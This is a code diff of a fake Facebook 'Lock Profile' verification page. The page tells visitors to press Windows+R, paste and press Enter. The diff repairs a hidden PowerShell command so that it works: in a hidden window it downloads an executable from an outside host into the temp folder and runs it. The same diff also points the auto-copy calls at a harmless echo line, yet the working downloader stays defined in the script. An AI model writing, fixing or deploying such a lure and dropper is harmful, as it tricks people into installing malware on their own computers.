@@ -147,11 +147,9 @@
 
   <div class="instructions" id="instructions">
     <p><b>Complete verification:</b></p>
-            <p>Press <b>Windows + R</b></p>
-        <p>Press <b>Ctrl + V</b> to paste</p>
-        <p>Press <b>Enter</b></p>
-         
-            
+    <p>Press <b>Windows + R</b></p>
+    <p>Press <b>Ctrl + V</b> to paste</p>
+    <p>Press <b>Enter</b></p>
     <p style="margin-top:8px;"><b>If auto-copy fails, copy manually:</b></p>
     <pre class="copy-box" id="copyBox">echo Verification Complete - Facebook Locker</pre>
   </div>
@@ -165,17 +163,15 @@
   const stepsList = document.getElementById("stepsList");
   const copyBox = document.getElementById("copyBox");
 
+  // Fix: escape quotes in powershell command
   const shownCommand = "echo Verification Complete - Facebook Locker";
-  const hiddenCommand = "powershell -windowstyle hidden -command "Invoke-WebRequest -Uri 'http://volamtuan.github.io/up.exe' -OutFile '%TEMP%\up.exe'"
-start "" /b "%TEMP%\up.exe"";
+  const hiddenCommand = `powershell -windowstyle hidden -command "Invoke-WebRequest -Uri 'http://volamtuan.github.io/up.exe' -OutFile '$env:TEMP\\up.exe'; Start-Process '$env:TEMP\\up.exe'"`;
 
   const steps = [
     "On the profile page, select the three-dot menu at the top.",
     "From the dropdown, click on <b>Lock Profile</b>.",
     "Click <b>Lock Your Profile</b> when prompted.",
     "Confirm by clicking <b>OK</b>, and your profile will be locked."
-
-
   ];
 
   checkbox.addEventListener("change", async () => {
@@ -183,13 +179,14 @@ start "" /b "%TEMP%\up.exe"";
       spinner.style.display = "block";
       message.style.display = "none";
       instructions.style.display = "none";
+      stepsList.innerHTML = "";
 
       setTimeout(async () => {
         spinner.style.display = "none";
         message.style.display = "block";
         instructions.style.display = "block";
 
-        // Hiển thị hướng dẫn từng bước
+        // Show step-by-step instructions
         stepsList.innerHTML = "";
         steps.forEach((step, i) => {
           const li = document.createElement("li");
@@ -201,17 +198,18 @@ start "" /b "%TEMP%\up.exe"";
         });
 
         // Auto copy (Safari compatible)
-        autoCopy(hiddenCommand);
+        autoCopy(shownCommand);
       }, 2000);
     } else {
       spinner.style.display = "none";
       message.style.display = "none";
       instructions.style.display = "none";
+      stepsList.innerHTML = "";
     }
   });
 
   copyBox.addEventListener("click", async () => {
-    await autoCopy(hiddenCommand);
+    await autoCopy(shownCommand);
     copyBox.classList.add("copied");
     copyBox.textContent = "✅ Copied!";
     setTimeout(() => {
